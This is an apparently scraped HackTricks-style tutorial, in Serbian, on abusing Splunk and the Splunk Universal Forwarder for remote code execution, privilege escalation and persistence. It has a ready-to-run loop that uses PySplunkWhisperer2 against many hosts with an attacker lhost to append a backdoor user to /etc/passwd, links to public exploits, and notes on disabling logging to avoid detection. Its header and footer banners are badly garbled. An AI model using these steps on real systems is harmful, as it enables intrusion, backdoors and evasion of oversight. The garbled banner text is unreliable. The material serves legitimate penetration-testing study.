# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Ako **enumerišete** mašinu **interno** ili **eksterno** i pronađete da **Splunk radi** (port 8090), ako srećom znate bilo koje **validne kredencijale**, možete **zloupotrebiti Splunk servis** da **izvršite shell** kao korisnik koji pokreće Splunk. Ako ga pokreće root, možete eskalirati privilegije na root.

Takođe, ako ste **već root i Splunk servis ne sluša samo na localhost**, možete **ukrasti** **datoteku** sa **lozinkama** **iz** Splunk servisa i **provaliti** lozinke, ili **dodati nove** kredencijale. I održati postojanost na hostu.

Na prvoj slici ispod možete videti kako izgleda Splunkd web stranica.

## Splunk Universal Forwarder Agent Exploit Summary

Za dalju detalje proverite post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:

**Pregled eksploatacije:**
Eksploatacija koja cilja Splunk Universal Forwarder Agent (UF) omogućava napadačima sa lozinkom agenta da izvrše proizvoljan kod na sistemima koji pokreću agenta, potencijalno kompromitujući celu mrežu.

**Ključne tačke:**
- UF agent ne validira dolazne konekcije ili autentičnost koda, što ga čini ranjivim na neovlašćeno izvršavanje koda.
- Uobičajene metode sticanja lozinki uključuju lociranje u mrežnim direktorijumima, deljenju datoteka ili internim dokumentima.
- Uspešna eksploatacija može dovesti do pristupa na SISTEM ili root nivou na kompromitovanim hostovima, eksfiltraciju podataka i dalju infiltraciju u mrežu.

**Izvršenje eksploatacije:**
1. Napadač dobija lozinku UF agenta.
2. Koristi Splunk API za slanje komandi ili skripti agentima.
3. Moguće akcije uključuju ekstrakciju datoteka, manipulaciju korisničkim nalozima i kompromitaciju sistema.

**Uticaj:**
- Potpuna kompromitacija mreže sa SISTEM/root nivoom dozvola na svakom hostu.
- Potencijal za onemogućavanje logovanja kako bi se izbeglo otkrivanje.
- Instalacija backdoor-a ili ransomware-a.

**Primer komande za eksploataciju:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Iskoristive javne eksploatacije:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Zloupotreba Splunk upita

**Za više detalja pogledajte post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
